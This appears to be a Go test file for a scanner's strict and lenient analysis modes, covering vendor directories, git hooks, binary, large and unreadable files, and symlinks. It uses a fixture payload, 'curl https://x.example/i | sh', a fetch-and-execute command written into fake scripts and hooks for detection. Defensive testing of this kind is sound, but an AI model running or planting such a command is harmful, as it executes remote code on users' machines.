package analyze

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/alexverify/eyebrow/internal/domain/artifact"
	"github.com/alexverify/eyebrow/internal/domain/finding"
)

const pipePayload = "curl https://x.example/i | sh\n"

func writeFile(t *testing.T, path string, b []byte) {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, b, 0o644); err != nil {
		t.Fatal(err)
	}
}

func hasFinding(fs []finding.Finding, rule, file string) bool {
	for _, f := range fs {
		if f.RuleID == rule && f.File == file {
			return true
		}
	}
	return false
}

func TestNewStrictNativeLimit(t *testing.T) {
	if n := NewStrictNative(); n.maxFileBytes != 32<<20 || !n.strict {
		t.Fatalf("strict analyzer: limit %d strict %v", n.maxFileBytes, n.strict)
	}
	if n := NewNative(); n.strict {
		t.Fatal("NewNative must not be strict")
	}
}

// Strict mode analyzes every directory, vendor dirs and .git included.
func TestStrictNativeAnalyzesVendorDirs(t *testing.T) {
	root := t.TempDir()
	for _, rel := range []string{"node_modules/x/run.sh", "venv/run.sh", ".git/hooks/post-checkout", "pkg.dist-info/run.sh"} {
		writeFile(t, filepath.Join(root, filepath.FromSlash(rel)), []byte(pipePayload))
	}
	got, err := NewStrictNative().Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatal(err)
	}
	for _, rel := range []string{"node_modules/x/run.sh", "venv/run.sh", ".git/hooks/post-checkout", "pkg.dist-info/run.sh"} {
		if !hasFinding(got, "RCE-PIPE-EXEC", rel) {
			t.Errorf("no RCE-PIPE-EXEC on %s: %+v", rel, got)
		}
	}
}

func TestStrictNativeReportsLargeAndBinaryFiles(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "big.txt"), []byte(strings.Repeat("a", 2048)))
	writeFile(t, filepath.Join(root, "blob.bin"), append([]byte{0}, []byte(pipePayload)...))
	n := NewStrictNative()
	n.maxFileBytes = 1024
	got, err := n.Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range got {
		if f.RuleID == finding.RuleUnscannedFile && f.Snippet != "" {
			t.Errorf("unscanned finding carries content: %+v", f)
		}
	}
	if !hasFinding(got, finding.RuleUnscannedFile, "big.txt") || !hasFinding(got, finding.RuleUnscannedFile, "blob.bin") {
		t.Fatalf("want CHECK-UNSCANNED-FILE on big.txt and blob.bin, got %+v", got)
	}
}

func TestStrictNativeReportsUnreadableFile(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("file permissions do not deny reads here")
	}
	root := t.TempDir()
	p := filepath.Join(root, "locked.sh")
	writeFile(t, p, []byte(pipePayload))
	if err := os.Chmod(p, 0); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = os.Chmod(p, 0o644) })
	got, err := NewStrictNative().Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatal(err)
	}
	if !hasFinding(got, finding.RuleUnscannedFile, "locked.sh") {
		t.Fatalf("want CHECK-UNSCANNED-FILE on locked.sh, got %+v", got)
	}
}

func TestStrictNativeSymlinks(t *testing.T) {
	outside := filepath.Join(t.TempDir(), "secret.sh")
	writeFile(t, outside, []byte(pipePayload))
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "inner.md"), []byte("ok\n"))
	links := map[string]string{
		"out.sh":   outside,
		"in.md":    filepath.Join(root, "inner.md"),
		"dangling": filepath.Join(root, "missing"),
		"loop":     filepath.Join(root, "loop"),
	}
	for name, target := range links {
		if err := os.Symlink(target, filepath.Join(root, name)); err != nil {
			t.Skipf("symlinks unavailable: %v", err)
		}
	}
	got, err := NewStrictNative().Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatal(err)
	}
	for _, name := range []string{"out.sh", "dangling", "loop"} {
		if !hasFinding(got, finding.RuleUnsafeEntry, name) {
			t.Errorf("want CHECK-UNSAFE-ENTRY on %s, got %+v", name, got)
		}
	}
	for _, f := range got {
		if f.File == "in.md" {
			t.Errorf("symlink inside the folder must yield nothing: %+v", f)
		}
		if f.RuleID == "RCE-PIPE-EXEC" {
			t.Errorf("symlink target was analyzed: %+v", f)
		}
	}
}

// The default analyzer keeps its behavior: vendor dirs skipped, binary and
// large files skipped silently, symlinks ignored.
func TestNativeStaysLenient(t *testing.T) {
	root := t.TempDir()
	writeFile(t, filepath.Join(root, "node_modules/x/run.sh"), []byte(pipePayload))
	writeFile(t, filepath.Join(root, "blob.bin"), []byte{0, 1})
	if err := os.Symlink(filepath.Join(t.TempDir(), "gone"), filepath.Join(root, "dangling")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	got, err := NewNative().Analyze(context.Background(), artifact.Artifact{}, root)
	if err != nil {
		t.Fatal(err)
	}
	if len(got) != 0 {
		t.Fatalf("lenient analyzer reported %+v", got)
	}
}
